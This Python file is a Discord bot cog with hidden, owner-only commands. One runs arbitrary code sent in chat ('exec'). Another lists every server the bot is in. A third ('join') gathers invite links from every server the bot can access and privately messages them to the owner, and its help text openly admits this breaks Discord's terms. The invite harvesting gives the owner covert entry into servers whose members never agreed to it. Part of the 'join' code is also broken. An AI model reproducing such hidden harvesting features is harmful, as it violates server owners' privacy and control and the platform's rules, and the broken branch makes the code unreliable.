#cog by Number1#4325
import disnake as discord
from disnake.ext import commands
import random
import asyncio
import datetime, time
import replit
from replit import db


class Bot(commands.Cog):
  def __init__(self, bot):
    self.bot = bot  

  #exec command
  @commands.command(help = "Execute python code", description = "bot owner only", hidden = True)
  @commands.is_owner()
  async def exec(self, ctx, *, code):
    exec(code)
    print(f"{code} is executed")
    e = discord.Embed(title = "Success", description = f"`{code}` is executed!", color = random.randint(0, 16777215))
    await ctx.send(embed = e)
  
  #joinlist command
  @commands.command(help = "Forgive me discord tos :(", description = "bot owner only", hidden = True)
  @commands.is_owner()
  async def joinlist(self, ctx):
    e = discord.Embed(title = "Server list", description = "\n".join(f'{guild.name}/{guild.id}' for guild in ctx.bot.guilds), color = random.randint(0, 16777215))
    await ctx.send(embed = e)

  #join command
  @commands.command(help = "Forgive me discord tos :(", description = "bot owner only", hidden = True)
  @commands.is_owner()
  async def join(self, ctx, id: discord.Guild = None):
    if id == None:
      out = {}
      await ctx.trigger_typing()
      for guild in self.bot.guilds:
          try:
              inv = await guild.invites()
          except:
              continue
          else:
              out[guild] = inv
      e = discord.Embed(title = "Invites", description = "\n".join(f"{guild.name}: {' '.join(invite.url for invite in inv)}" for guild, inv in out.items()), color = random.randint(0, 16777215))
      await ctx.author.send(embed = e)
    else:
      out = {}
      await ctx.trigger_typing()
      try:
        inv = await id.guild.invites()
      except:
        inv = None
      else:
        out[id.guild] = inv
      e = discord.Embed(title = "Invites", description = "\n".join(f"{id.guild.name}: {' '.join(invite.url for invite in inv)}"))
    


def setup(bot):
  bot.add_cog(Bot(bot))